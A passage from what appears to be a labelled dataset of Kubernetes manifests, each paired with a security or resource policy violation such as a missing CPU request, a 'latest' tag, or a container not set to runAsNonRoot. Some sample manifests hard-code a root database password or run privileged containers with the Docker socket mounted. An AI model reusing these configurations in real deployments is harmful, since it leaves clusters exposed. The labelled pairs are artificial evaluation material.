    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: boskos-reaper\n  labels:\n    app: boskos-reaper\n  namespace: test-pods\nspec:\n  selector:\n    matchLabels:\n      app: boskos-reaper\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: boskos-reaper\n    spec:\n      containers:\n      - name: boskos-reaper\n        image: gcr.io/k8s-prow/boskos/reaper:v20200501-e6124e633\n        args:\n        - --boskos-url=http://boskos.test-pods.svc.cluster.local.\n        - --resource-type=gce-project,gke-project,gpu-project,ingress-project,istio-project,scalability-presubmit-project,scalability-project,aws-account,node-e2e-project\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"boskos-reaper\" has cpu request 0"
  },
  {
    "id": "00931",
    "manifest_path": "data/manifests/the_stack_sample/sample_0225.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: boskos-reaper\n  labels:\n    app: boskos-reaper\n  namespace: test-pods\nspec:\n  selector:\n    matchLabels:\n      app: boskos-reaper\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: boskos-reaper\n    spec:\n      containers:\n      - name: boskos-reaper\n        image: gcr.io/k8s-prow/boskos/reaper:v20200501-e6124e633\n        args:\n        - --boskos-url=http://boskos.test-pods.svc.cluster.local.\n        - --resource-type=gce-project,gke-project,gpu-project,ingress-project,istio-project,scalability-presubmit-project,scalability-project,aws-account,node-e2e-project\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"boskos-reaper\" has memory limit 0"
  },
  {
    "id": "00932",
    "manifest_path": "data/manifests/the_stack_sample/sample_0229.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: monitoring-heapster-v6\n  namespace: kube-system\n  labels:\n    k8s-app: heapster\n    version: v6\n    kubernetes.io/cluster-service: 'true'\nspec:\n  replicas: 1\n  selector:\n    k8s-app: heapster\n    version: v6\n  template:\n    metadata:\n      labels:\n        k8s-app: heapster\n        version: v6\n        kubernetes.io/cluster-service: 'true'\n    spec:\n      containers:\n      - image: gcr.io/google_containers/heapster:v0.16.1\n        name: heapster\n        resources:\n          limits:\n            cpu: 100m\n            memory: 300Mi\n        command:\n        - /heapster\n        - --source=kubernetes:''\n        - --sink=gcl\n        - --sink=influxdb:http://monitoring-influxdb:8086\n        - --poll_duration=2m\n        - --stats_resolution=1m\n        volumeMounts:\n        - name: ssl-certs\n          mountPath: /etc/ssl/certs\n          readOnly: true\n      volumes:\n      - name: ssl-certs\n        hostPath:\n          path: /etc/ssl/certs\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"heapster\" does not have a read-only root file system"
  },
  {
    "id": "00933",
    "manifest_path": "data/manifests/the_stack_sample/sample_0229.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: monitoring-heapster-v6\n  namespace: kube-system\n  labels:\n    k8s-app: heapster\n    version: v6\n    kubernetes.io/cluster-service: 'true'\nspec:\n  replicas: 1\n  selector:\n    k8s-app: heapster\n    version: v6\n  template:\n    metadata:\n      labels:\n        k8s-app: heapster\n        version: v6\n        kubernetes.io/cluster-service: 'true'\n    spec:\n      containers:\n      - image: gcr.io/google_containers/heapster:v0.16.1\n        name: heapster\n        resources:\n          limits:\n            cpu: 100m\n            memory: 300Mi\n        command:\n        - /heapster\n        - --source=kubernetes:''\n        - --sink=gcl\n        - --sink=influxdb:http://monitoring-influxdb:8086\n        - --poll_duration=2m\n        - --stats_resolution=1m\n        volumeMounts:\n        - name: ssl-certs\n          mountPath: /etc/ssl/certs\n          readOnly: true\n      volumes:\n      - name: ssl-certs\n        hostPath:\n          path: /etc/ssl/certs\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"heapster\" is not set to runAsNonRoot"
  },
  {
    "id": "00934",
    "manifest_path": "data/manifests/the_stack_sample/sample_0229.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: monitoring-heapster-v6\n  namespace: kube-system\n  labels:\n    k8s-app: heapster\n    version: v6\n    kubernetes.io/cluster-service: 'true'\nspec:\n  replicas: 1\n  selector:\n    k8s-app: heapster\n    version: v6\n  template:\n    metadata:\n      labels:\n        k8s-app: heapster\n        version: v6\n        kubernetes.io/cluster-service: 'true'\n    spec:\n      containers:\n      - image: gcr.io/google_containers/heapster:v0.16.1\n        name: heapster\n        resources:\n          limits:\n            cpu: 100m\n            memory: 300Mi\n        command:\n        - /heapster\n        - --source=kubernetes:''\n        - --sink=gcl\n        - --sink=influxdb:http://monitoring-influxdb:8086\n        - --poll_duration=2m\n        - --stats_resolution=1m\n        volumeMounts:\n        - name: ssl-certs\n          mountPath: /etc/ssl/certs\n          readOnly: true\n      volumes:\n      - name: ssl-certs\n        hostPath:\n          path: /etc/ssl/certs\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"heapster\" has cpu request 0"
  },
  {
    "id": "00935",
    "manifest_path": "data/manifests/the_stack_sample/sample_0230.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: users-deployment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      component: users\n  template:\n    metadata:\n      labels:\n        component: users\n    spec:\n      containers:\n      - name: users\n        image: sbalasubramanian14/users-api\n        ports:\n        - containerPort: 5000\n        env:\n        - name: DATABASE_HOST\n          value: mysql-cluster-ip-service\n        - name: DATABASE_NAME\n          value: mydatabase\n        - name: DATABASE_USERNAME\n          value: root\n        - name: DATABASE_PASSWORD\n          value: admin@123\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"users\" is using an invalid container image, \"sbalasubramanian14/users-api\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "00936",
    "manifest_path": "data/manifests/the_stack_sample/sample_0230.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: users-deployment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      component: users\n  template:\n    metadata:\n      labels:\n        component: users\n    spec:\n      containers:\n      - name: users\n        image: sbalasubramanian14/users-api\n        ports:\n        - containerPort: 5000\n        env:\n        - name: DATABASE_HOST\n          value: mysql-cluster-ip-service\n        - name: DATABASE_NAME\n          value: mydatabase\n        - name: DATABASE_USERNAME\n          value: root\n        - name: DATABASE_PASSWORD\n          value: admin@123\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"users\" does not have a read-only root file system"
  },
  {
    "id": "00937",
    "manifest_path": "data/manifests/the_stack_sample/sample_0230.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: users-deployment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      component: users\n  template:\n    metadata:\n      labels:\n        component: users\n    spec:\n      containers:\n      - name: users\n        image: sbalasubramanian14/users-api\n        ports:\n        - containerPort: 5000\n        env:\n        - name: DATABASE_HOST\n          value: mysql-cluster-ip-service\n        - name: DATABASE_NAME\n          value: mydatabase\n        - name: DATABASE_USERNAME\n          value: root\n        - name: DATABASE_PASSWORD\n          value: admin@123\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"users\" is not set to runAsNonRoot"
  },
  {
    "id": "00938",
    "manifest_path": "data/manifests/the_stack_sample/sample_0230.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: users-deployment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      component: users\n  template:\n    metadata:\n      labels:\n        component: users\n    spec:\n      containers:\n      - name: users\n        image: sbalasubramanian14/users-api\n        ports:\n        - containerPort: 5000\n        env:\n        - name: DATABASE_HOST\n          value: mysql-cluster-ip-service\n        - name: DATABASE_NAME\n          value: mydatabase\n        - name: DATABASE_USERNAME\n          value: root\n        - name: DATABASE_PASSWORD\n          value: admin@123\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"users\" has cpu request 0"
  },
  {
    "id": "00939",
    "manifest_path": "data/manifests/the_stack_sample/sample_0230.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: users-deployment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      component: users\n  template:\n    metadata:\n      labels:\n        component: users\n    spec:\n      containers:\n      - name: users\n        image: sbalasubramanian14/users-api\n        ports:\n        - containerPort: 5000\n        env:\n        - name: DATABASE_HOST\n          value: mysql-cluster-ip-service\n        - name: DATABASE_NAME\n          value: mydatabase\n        - name: DATABASE_USERNAME\n          value: root\n        - name: DATABASE_PASSWORD\n          value: admin@123\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"users\" has memory limit 0"
  },
  {
    "id": "00940",
    "manifest_path": "data/manifests/the_stack_sample/sample_0233.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: cilium\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: cilium\n      kubernetes.io/cluster-service: 'true'\n  template:\n    metadata:\n      labels:\n        k8s-app: cilium\n        kubernetes.io/cluster-service: 'true'\n      annotations:\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n        scheduler.alpha.kubernetes.io/tolerations: '[{\"key\":\"dedicated\",\"operator\":\"Equal\",\"value\":\"master\",\"effect\":\"NoSchedule\"}]'\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      serviceAccountName: cilium\n      initContainers:\n      - name: clean-cilium-state\n        image: docker.io/library/busybox:1.28.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - if [ \"${CLEAN_CILIUM_STATE}\" = \"true\" ]; then rm -rf /var/run/cilium/state;\n          rm -rf /sys/fs/bpf/tc/globals/cilium_*; fi\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n          privileged: true\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        env:\n        - name: CLEAN_CILIUM_STATE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: clean-cilium-state\n      containers:\n      - image: docker.io/cilium/cilium:latest\n        imagePullPolicy: Always\n        name: cilium-agent\n        command:\n        - cilium-agent\n        args:\n        - --debug=$(CILIUM_DEBUG)\n        - --kvstore=etcd\n        - --kvstore-opt=etcd.config=/var/lib/etcd-config/etcd.config\n        - --disable-ipv4=$(DISABLE_IPV4)\n        ports:\n        - name: prometheus\n          containerPort: 9090\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CILIUM_DEBUG\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: debug\n        - name: DISABLE_IPV4\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: disable-ipv4\n        - name: CILIUM_PROMETHEUS_SERVE_ADDR\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-metrics-config\n              optional: true\n              key: prometheus-serve-addr\n        - name: CILIUM_LEGACY_HOST_ALLOWS_WORLD\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: legacy-host-allows-world\n        - name: CILIUM_SIDECAR_ISTIO_PROXY_IMAGE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: sidecar-istio-proxy-image\n              optional: true\n        - name: CILIUM_TUNNEL\n          valueFrom:\n            configMapKeyRef:\n              key: tunnel\n              name: cilium-config\n              optional: true\n        - name: CILIUM_MONITOR_AGGREGATION_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              key: monitor-aggregation-level\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTERMESH_CONFIG\n          value: /var/lib/cilium/clustermesh/\n        - name: CILIUM_CLUSTER_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-name\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTER_ID\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-id\n              name: cilium-config\n              optional: true\n        livenessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 120\n          failureThreshold: 10\n          periodSeconds: 10\n        readinessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        - name: cni-path\n          mountPath: /host/opt/cni/bin\n        - name: etc-cni-netd\n          mountPath: /host/etc/cni/net.d\n        - name: docker-socket\n          mountPath: /var/run/docker.sock\n          readOnly: true\n        - name: etcd-config-path\n          mountPath: /var/lib/etcd-config\n          readOnly: true\n        - name: etcd-secrets\n          mountPath: /var/lib/etcd-secrets\n          readOnly: true\n        - name: clustermesh-secrets\n          mountPath: /var/lib/cilium/clustermesh\n          readOnly: true\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n          privileged: true\n      volumes:\n      - name: cilium-run\n        hostPath:\n          path: /var/run/cilium\n          type: DirectoryOrCreate\n      - name: bpf-maps\n        hostPath:\n          path: /sys/fs/bpf\n          type: DirectoryOrCreate\n      - name: docker-socket\n        hostPath:\n          path: /var/run/docker.sock\n          type: Socket\n      - name: cni-path\n        hostPath:\n          path: /opt/cni/bin\n          type: DirectoryOrCreate\n      - name: etc-cni-netd\n        hostPath:\n          path: /etc/cni/net.d\n          type: DirectoryOrCreate\n      - name: etcd-config-path\n        configMap:\n          name: cilium-config\n          items:\n          - key: etcd-config\n            path: etcd.config\n      - name: etcd-secrets\n        secret:\n          secretName: cilium-etcd-secrets\n          optional: true\n      - name: clustermesh-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-clustermesh\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"cilium-agent\" is using an invalid container image, \"docker.io/cilium/cilium:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "00941",
    "manifest_path": "data/manifests/the_stack_sample/sample_0233.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: cilium\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: cilium\n      kubernetes.io/cluster-service: 'true'\n  template:\n    metadata:\n      labels:\n        k8s-app: cilium\n        kubernetes.io/cluster-service: 'true'\n      annotations:\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n        scheduler.alpha.kubernetes.io/tolerations: '[{\"key\":\"dedicated\",\"operator\":\"Equal\",\"value\":\"master\",\"effect\":\"NoSchedule\"}]'\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      serviceAccountName: cilium\n      initContainers:\n      - name: clean-cilium-state\n        image: docker.io/library/busybox:1.28.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - if [ \"${CLEAN_CILIUM_STATE}\" = \"true\" ]; then rm -rf /var/run/cilium/state;\n          rm -rf /sys/fs/bpf/tc/globals/cilium_*; fi\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n          privileged: true\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        env:\n        - name: CLEAN_CILIUM_STATE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: clean-cilium-state\n      containers:\n      - image: docker.io/cilium/cilium:latest\n        imagePullPolicy: Always\n        name: cilium-agent\n        command:\n        - cilium-agent\n        args:\n        - --debug=$(CILIUM_DEBUG)\n        - --kvstore=etcd\n        - --kvstore-opt=etcd.config=/var/lib/etcd-config/etcd.config\n        - --disable-ipv4=$(DISABLE_IPV4)\n        ports:\n        - name: prometheus\n          containerPort: 9090\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CILIUM_DEBUG\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: debug\n        - name: DISABLE_IPV4\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: disable-ipv4\n        - name: CILIUM_PROMETHEUS_SERVE_ADDR\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-metrics-config\n              optional: true\n              key: prometheus-serve-addr\n        - name: CILIUM_LEGACY_HOST_ALLOWS_WORLD\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: legacy-host-allows-world\n        - name: CILIUM_SIDECAR_ISTIO_PROXY_IMAGE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: sidecar-istio-proxy-image\n              optional: true\n        - name: CILIUM_TUNNEL\n          valueFrom:\n            configMapKeyRef:\n              key: tunnel\n              name: cilium-config\n              optional: true\n        - name: CILIUM_MONITOR_AGGREGATION_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              key: monitor-aggregation-level\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTERMESH_CONFIG\n          value: /var/lib/cilium/clustermesh/\n        - name: CILIUM_CLUSTER_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-name\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTER_ID\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-id\n              name: cilium-config\n              optional: true\n        livenessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 120\n          failureThreshold: 10\n          periodSeconds: 10\n        readinessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        - name: cni-path\n          mountPath: /host/opt/cni/bin\n        - name: etc-cni-netd\n          mountPath: /host/etc/cni/net.d\n        - name: docker-socket\n          mountPath: /var/run/docker.sock\n          readOnly: true\n        - name: etcd-config-path\n          mountPath: /var/lib/etcd-config\n          readOnly: true\n        - name: etcd-secrets\n          mountPath: /var/lib/etcd-secrets\n          readOnly: true\n        - name: clustermesh-secrets\n          mountPath: /var/lib/cilium/clustermesh\n          readOnly: true\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n          privileged: true\n      volumes:\n      - name: cilium-run\n        hostPath:\n          path: /var/run/cilium\n          type: DirectoryOrCreate\n      - name: bpf-maps\n        hostPath:\n          path: /sys/fs/bpf\n          type: DirectoryOrCreate\n      - name: docker-socket\n        hostPath:\n          path: /var/run/docker.sock\n          type: Socket\n      - name: cni-path\n        hostPath:\n          path: /opt/cni/bin\n          type: DirectoryOrCreate\n      - name: etc-cni-netd\n        hostPath:\n          path: /etc/cni/net.d\n          type: DirectoryOrCreate\n      - name: etcd-config-path\n        configMap:\n          name: cilium-config\n          items:\n          - key: etcd-config\n            path: etcd.config\n      - name: etcd-secrets\n        secret:\n          secretName: cilium-etcd-secrets\n          optional: true\n      - name: clustermesh-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-clustermesh\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cilium-agent\" does not have a read-only root file system"
  },
  {
    "id": "00942",
    "manifest_path": "data/manifests/the_stack_sample/sample_0233.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: cilium\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: cilium\n      kubernetes.io/cluster-service: 'true'\n  template:\n    metadata:\n      labels:\n        k8s-app: cilium\n        kubernetes.io/cluster-service: 'true'\n      annotations:\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n        scheduler.alpha.kubernetes.io/tolerations: '[{\"key\":\"dedicated\",\"operator\":\"Equal\",\"value\":\"master\",\"effect\":\"NoSchedule\"}]'\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      serviceAccountName: cilium\n      initContainers:\n      - name: clean-cilium-state\n        image: docker.io/library/busybox:1.28.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - if [ \"${CLEAN_CILIUM_STATE}\" = \"true\" ]; then rm -rf /var/run/cilium/state;\n          rm -rf /sys/fs/bpf/tc/globals/cilium_*; fi\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n          privileged: true\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        env:\n        - name: CLEAN_CILIUM_STATE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: clean-cilium-state\n      containers:\n      - image: docker.io/cilium/cilium:latest\n        imagePullPolicy: Always\n        name: cilium-agent\n        command:\n        - cilium-agent\n        args:\n        - --debug=$(CILIUM_DEBUG)\n        - --kvstore=etcd\n        - --kvstore-opt=etcd.config=/var/lib/etcd-config/etcd.config\n        - --disable-ipv4=$(DISABLE_IPV4)\n        ports:\n        - name: prometheus\n          containerPort: 9090\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CILIUM_DEBUG\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: debug\n        - name: DISABLE_IPV4\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: disable-ipv4\n        - name: CILIUM_PROMETHEUS_SERVE_ADDR\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-metrics-config\n              optional: true\n              key: prometheus-serve-addr\n        - name: CILIUM_LEGACY_HOST_ALLOWS_WORLD\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: legacy-host-allows-world\n        - name: CILIUM_SIDECAR_ISTIO_PROXY_IMAGE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: sidecar-istio-proxy-image\n              optional: true\n        - name: CILIUM_TUNNEL\n          valueFrom:\n            configMapKeyRef:\n              key: tunnel\n              name: cilium-config\n              optional: true\n        - name: CILIUM_MONITOR_AGGREGATION_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              key: monitor-aggregation-level\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTERMESH_CONFIG\n          value: /var/lib/cilium/clustermesh/\n        - name: CILIUM_CLUSTER_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-name\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTER_ID\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-id\n              name: cilium-config\n              optional: true\n        livenessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 120\n          failureThreshold: 10\n          periodSeconds: 10\n        readinessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        - name: cni-path\n          mountPath: /host/opt/cni/bin\n        - name: etc-cni-netd\n          mountPath: /host/etc/cni/net.d\n        - name: docker-socket\n          mountPath: /var/run/docker.sock\n          readOnly: true\n        - name: etcd-config-path\n          mountPath: /var/lib/etcd-config\n          readOnly: true\n        - name: etcd-secrets\n          mountPath: /var/lib/etcd-secrets\n          readOnly: true\n        - name: clustermesh-secrets\n          mountPath: /var/lib/cilium/clustermesh\n          readOnly: true\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n          privileged: true\n      volumes:\n      - name: cilium-run\n        hostPath:\n          path: /var/run/cilium\n          type: DirectoryOrCreate\n      - name: bpf-maps\n        hostPath:\n          path: /sys/fs/bpf\n          type: DirectoryOrCreate\n      - name: docker-socket\n        hostPath:\n          path: /var/run/docker.sock\n          type: Socket\n      - name: cni-path\n        hostPath:\n          path: /opt/cni/bin\n          type: DirectoryOrCreate\n      - name: etc-cni-netd\n        hostPath:\n          path: /etc/cni/net.d\n          type: DirectoryOrCreate\n      - name: etcd-config-path\n        configMap:\n          name: cilium-config\n          items:\n          - key: etcd-config\n            path: etcd.config\n      - name: etcd-secrets\n        secret:\n          secretName: cilium-etcd-secrets\n          optional: true\n      - name: clustermesh-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-clustermesh\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"clean-cilium-state\" does not have a read-only root file system"
  },
  {
    "id": "00943",
    "manifest_path": "data/manifests/the_stack_sample/sample_0233.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: cilium\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: cilium\n      kubernetes.io/cluster-service: 'true'\n  template:\n    metadata:\n      labels:\n        k8s-app: cilium\n        kubernetes.io/cluster-service: 'true'\n      annotations:\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n        scheduler.alpha.kubernetes.io/tolerations: '[{\"key\":\"dedicated\",\"operator\":\"Equal\",\"value\":\"master\",\"effect\":\"NoSchedule\"}]'\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      serviceAccountName: cilium\n      initContainers:\n      - name: clean-cilium-state\n        image: docker.io/library/busybox:1.28.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - if [ \"${CLEAN_CILIUM_STATE}\" = \"true\" ]; then rm -rf /var/run/cilium/state;\n          rm -rf /sys/fs/bpf/tc/globals/cilium_*; fi\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n          privileged: true\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        env:\n        - name: CLEAN_CILIUM_STATE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: clean-cilium-state\n      containers:\n      - image: docker.io/cilium/cilium:latest\n        imagePullPolicy: Always\n        name: cilium-agent\n        command:\n        - cilium-agent\n        args:\n        - --debug=$(CILIUM_DEBUG)\n        - --kvstore=etcd\n        - --kvstore-opt=etcd.config=/var/lib/etcd-config/etcd.config\n        - --disable-ipv4=$(DISABLE_IPV4)\n        ports:\n        - name: prometheus\n          containerPort: 9090\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CILIUM_DEBUG\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: debug\n        - name: DISABLE_IPV4\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: disable-ipv4\n        - name: CILIUM_PROMETHEUS_SERVE_ADDR\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-metrics-config\n              optional: true\n              key: prometheus-serve-addr\n        - name: CILIUM_LEGACY_HOST_ALLOWS_WORLD\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: legacy-host-allows-world\n        - name: CILIUM_SIDECAR_ISTIO_PROXY_IMAGE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: sidecar-istio-proxy-image\n              optional: true\n        - name: CILIUM_TUNNEL\n          valueFrom:\n            configMapKeyRef:\n              key: tunnel\n              name: cilium-config\n              optional: true\n        - name: CILIUM_MONITOR_AGGREGATION_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              key: monitor-aggregation-level\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTERMESH_CONFIG\n          value: /var/lib/cilium/clustermesh/\n        - name: CILIUM_CLUSTER_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-name\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTER_ID\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-id\n              name: cilium-config\n              optional: true\n        livenessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 120\n          failureThreshold: 10\n          periodSeconds: 10\n        readinessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        - name: cni-path\n          mountPath: /host/opt/cni/bin\n        - name: etc-cni-netd\n          mountPath: /host/etc/cni/net.d\n        - name: docker-socket\n          mountPath: /var/run/docker.sock\n          readOnly: true\n        - name: etcd-config-path\n          mountPath: /var/lib/etcd-config\n          readOnly: true\n        - name: etcd-secrets\n          mountPath: /var/lib/etcd-secrets\n          readOnly: true\n        - name: clustermesh-secrets\n          mountPath: /var/lib/cilium/clustermesh\n          readOnly: true\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n          privileged: true\n      volumes:\n      - name: cilium-run\n        hostPath:\n          path: /var/run/cilium\n          type: DirectoryOrCreate\n      - name: bpf-maps\n        hostPath:\n          path: /sys/fs/bpf\n          type: DirectoryOrCreate\n      - name: docker-socket\n        hostPath:\n          path: /var/run/docker.sock\n          type: Socket\n      - name: cni-path\n        hostPath:\n          path: /opt/cni/bin\n          type: DirectoryOrCreate\n      - name: etc-cni-netd\n        hostPath:\n          path: /etc/cni/net.d\n          type: DirectoryOrCreate\n      - name: etcd-config-path\n        configMap:\n          name: cilium-config\n          items:\n          - key: etcd-config\n            path: etcd.config\n      - name: etcd-secrets\n        secret:\n          secretName: cilium-etcd-secrets\n          optional: true\n      - name: clustermesh-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-clustermesh\n",
    "policy_id": "privilege-escalation-container",
